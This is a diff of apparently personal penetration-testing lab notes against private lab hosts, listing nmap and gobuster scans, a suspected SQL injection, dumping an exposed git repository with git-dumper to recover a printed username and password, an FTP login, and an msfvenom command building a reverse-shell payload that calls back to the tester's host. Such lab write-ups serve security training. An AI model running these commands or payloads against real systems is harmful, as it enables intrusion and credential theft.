@@ -8,7 +8,7 @@ nmap -sT -A -oN nmap-lab1 192.168.193.141 192.168.193.143-145
 .141
 ```
 gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirb/big.txt
-gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
+gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf,zip
 # find admin page on 181
 
 # determined that the admin username field was vulnerable to sqli, but could not manually do SQL injection
@@ -100,6 +100,18 @@ gobuster dir -u http://192.168.193.144 -w /usr/share/wordlists/dirb/big.txt
 # find that it is running joomla CMS
 # also find a git repo that includes a security update
 joomscan -u http://192.168.193.144
+# joomscan for me does not return anything
 
-
+# use gitdumper to gain creds from the git logs
+https://github.com/arthaud/git-dumper/blob/master/git_dumper.py
+python3 git_dumper.py http://192.168.193.144 /home/kali/lab1/test
+git show # reveal password
+# username: stuart@challenge.lab
+# password: BreakingBad92
+ftp stuart@192.168.193.144
+> binary
+> passive (turn it off)
+> ls
+# try reverse shell
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f sh -o linux-shell
 ```
